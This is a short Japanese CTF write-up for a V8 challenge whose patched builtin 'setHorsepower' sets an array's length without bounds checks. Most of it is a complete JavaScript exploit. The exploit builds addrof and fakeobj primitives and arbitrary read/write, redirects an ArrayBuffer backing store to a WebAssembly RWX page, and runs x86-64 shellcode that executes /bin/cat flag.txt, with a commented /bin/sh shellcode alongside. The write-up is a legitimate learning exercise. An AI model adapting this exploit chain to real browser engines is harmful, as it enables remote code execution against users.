## tl;dr

v8 exploit, shellcode

## プログラム

```diff
+namespace array {
+
+transitioning javascript builtin
+ArraySetHorsepower(
+  js-implicit context: NativeContext, receiver: JSAny)(horsepower: JSAny): JSAny {
+    try {
+      const h: Smi = Cast<Smi>(horsepower) otherwise End;
+      const a: JSArray = Cast<JSArray>(receiver) otherwise End;
+      a.SetLength(h);
+    } label End {
+        Print("Improper attempt to set horsepower");
+    }
+    return receiver;
+}
+}
...
+    SimpleInstallFunction(isolate_, proto, "setHorsepower",
+                          Builtins::kArraySetHorsepower, 1, false);
...
+  macro SetLength(l: Smi) {
+    this.length = l;
+  }
```

`A.setHorsepower(3)` とかで長さを変えてくれるんですが、明らかに out-of-bounds があります。やばいね！

## 解法

[これ](https://pwning.tech/2020/09/09/v8-pwn-downunderctf/) に尽きます。解法はほぼ全てここに書いてあるので、詳しくはリンク先を読んで下さい。

脆弱性が両方 out-of-bounds ですので、 writeup を読みながら細かい数を修正したり実験したりすると上手く行きます。

ですが、その修正が結構苦行でした...。`%DebugPrint` でアドレスを確認したり、GDB でメモリを確認したり。

shellcode は Kit Engine で作った `execve("/bin/cat",["/bin/cat","flag.txt",NULL],NULL)` を使いまわして、payload は以下となります。

途中で `for(let i;i<1000000;i++);` を挟んでいるのは、ちょっと待つためです。これがないと微妙に上手く行きませんでした。

```js
var aux_obj={"a":1};
var aux_obj_arr=[aux_obj];
var aux_float_arr=[1.1,2.2,3.3];
var aux_arr=aux_float_arr.slice(aux_float_arr).setHorsepower(10);

var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf); 
var u64_buf = new Uint32Array(buf); 

function ftoi(val, size) {f64_buf[0] = val; if(size == 32) {return BigInt(u64_buf[0]); } else if(size == 64) { return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); } } 
function itof(val, size) { if(size == 32) { u64_buf[0] = Number(val & 0xffffffffn); } else if(size == 64) { u64_buf[0] = Number(val & 0xffffffffn); u64_buf[1] = Number(val >> 32n); } return f64_buf[0]; }
var flt_arr_map=ftoi(aux_arr[3],32);
var elem_arr_ptr=ftoi(aux_arr[4],32);

//%DebugPrint(aux_obj_arr);
//%DebugPrint(aux_arr);

console.log("[+] Float array map: 0x" + flt_arr_map.toString(16));
console.log("[+] Pointer to array elements: 0x" + elem_arr_ptr.toString(16));

var elem_obj_arr=elem_arr_ptr-0x148n;
console.log("[+] Pointer to object array elements: 0x" + elem_obj_arr.toString(16));
aux_arr[4] = itof((ftoi(aux_arr[4], 64) & 0xffffffff00000000n) + elem_obj_arr + 0x8cn, 64);

//console.log("0x"+ftoi(aux_arr[0],64).toString(16));


var obj_arr_map=ftoi(aux_arr[0],64)>>32n;
console.log("[+] Object array map: 0x" + obj_arr_map.toString(16));

//%DebugPrint(aux_obj_arr);

function addrof(obj) { var aux_arr=aux_float_arr.slice(aux_float_arr).setHorsepower(10);aux_arr[4] = itof((ftoi(aux_arr[4], 64) & 0xffffffff00000000n) + elem_obj_arr + 0x88n, 64); aux_obj_arr[0] = obj; return ftoi(aux_arr[0], 64)>>32n;}
function fakeobj(addr) { 
    let fake; 
    var aux_arr=aux_float_arr.slice(aux_float_arr).setHorsepower(10);
    aux_arr[0] = itof(addr, 32); 
    aux_arr[3] = itof((ftoi(aux_arr[3], 64) & 0xffffffff00000000n) + obj_arr_map+0x88n, 64); fake = aux_arr[0]; return fake; }

var rw_helper=[itof(flt_arr_map,64),1.1,2.2,3.3];
var rw_helper_addr=addrof(rw_helper)&0xffffffffn;
console.log("[+] Controlled RW helper address: 0x" + rw_helper_addr.toString(16));

//%DebugPrint(rw_helper);

function arb_read(addr){
    let fake=fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1]=itof((0x8n<<32n)+addr-0x8n,64);
    return ftoi(fake[0],64);
}

function arb_write(addr,value){
    let fake=fakeobj(rw_helper_addr - 0x20n);
    rw_helper[1] = itof((0x8n << 32n) + addr - 0x8n, 64);
    fake[0]=itof(value,64);
}

console.log("0x"+ftoi(rw_helper[0], 32).toString(16));
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3, 130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131, 128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128, 128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0, 0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);
var wasm_module = new WebAssembly.Module(wasmCode);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var pwn = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance) & 0xffffffffn;
var rwx = arb_read(wasm_instance_addr + 0x68n);

for(let i;i<1000000;i++);

console.log("[+] Wasm instance address: 0x" + wasm_instance_addr.toString(16)); 
console.log("[+] RWX section address: 0x" + rwx.toString(16));


var arr_buf=new ArrayBuffer(0x100);
var dataview=new DataView(arr_buf);

var arr_buf_addr = addrof(arr_buf) & 0xffffffffn;
var back_store_addr = arb_read(arr_buf_addr + 0x14n);

console.log("[+] ArrayBuffer address: 0x" + arr_buf_addr.toString(16)); 
console.log("[+] Back store pointer: 0x" + back_store_addr.toString(16));

arb_write(arr_buf_addr + 0x14n, rwx);

var shellcode = [0x48,0x31,0xc0,0x48,0x31,0xdb,0x53,0x48,0xbb,0x66,0x6c,0x61,0x67,0x2e,0x74,0x78,0x74,0x53,0x54,0x5b,0x48,0x31,0xc9,0x51,0x48,0xb9,0x2f,0x62,0x69,0x6e,0x2f,0x63,0x61,0x74,0x51,0x54,0x59,0x50,0x53,0x51,0x54,0x5e,0x48,0x31,0xdb,0x53,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x63,0x61,0x74,0x53,0x54,0x5f,0x48,0xc7,0xc0,0x3b,0x0,0x0,0x0,0x99,0xf,0x5]
//var shellcode=[0x48,0x31,0xf6,0x56,0x48,0xbf,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x57,0x54,0x5f,0xb0,0x3b,0x99,0x0f,0x05];

for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
}
console.log("[+] Spawning a shell...");
pwn();
//%DebugPrint(arr_buf);
```

辛すぎん？